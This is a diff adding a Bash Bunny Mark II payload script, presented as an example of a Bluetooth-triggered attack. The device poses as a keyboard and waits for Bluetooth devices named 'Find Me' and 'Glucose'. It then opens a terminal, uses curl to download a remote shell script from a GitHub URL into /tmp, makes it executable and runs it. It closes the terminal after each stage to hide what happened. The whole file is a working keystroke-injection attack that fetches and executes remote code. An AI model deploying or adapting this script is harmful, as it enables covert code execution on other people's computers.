@@ -1,0 +1,54 @@
+#
+# Remote Trigger with bluetooth for Bash Bunny Mark II Example
+#
+
+######## INITIALIZATION ########
+
+readonly PAYLOAD_DOWNLOAD_URI="https://raw.githubusercontent.com/SlyJose/whatdoyoumeanthisispii/main/remote.sh"
+
+###############################
+
+LED SETUP
+
+#
+# Stage 1: Hidden USB on Dock
+#
+ATTACKMODE HID
+LED STAGE1
+WAIT_FOR_PRESENT Find Me        #'Find Me' is the ID used to find the triggering device
+
+#
+# Stage 2: Obtain payload
+#
+LED STAGE2
+Q CTRL-ALT t
+Q DELAY 2000
+Q STRING "bash"
+Q ENTER
+Q DELAY 1000
+Q STRING "curl ${PAYLOAD_DOWNLOAD_URI} --output /tmp/bb"
+Q ENTER
+Q DELAY 5000
+Q CTRL-SHIFT q
+Q DELAY 1000
+Q ENTER
+WAIT_FOR_PRESENT Glucose        #'Glucose' is the ID used to find the triggering device
+
+#
+# Stage 3: Execute payload
+#
+LED STAGE3
+Q CTRL-ALT t
+Q DELAY 2000
+Q STRING "chmod +x /tmp/bb"
+Q ENTER
+Q STRING "cd /tmp"
+Q ENTER
+Q STRING "./bb"
+Q ENTER
+Q DELAY 1000
+Q CTRL-SHIFT q
+Q DELAY 1000
+Q ENTER
+
+LED FINISH
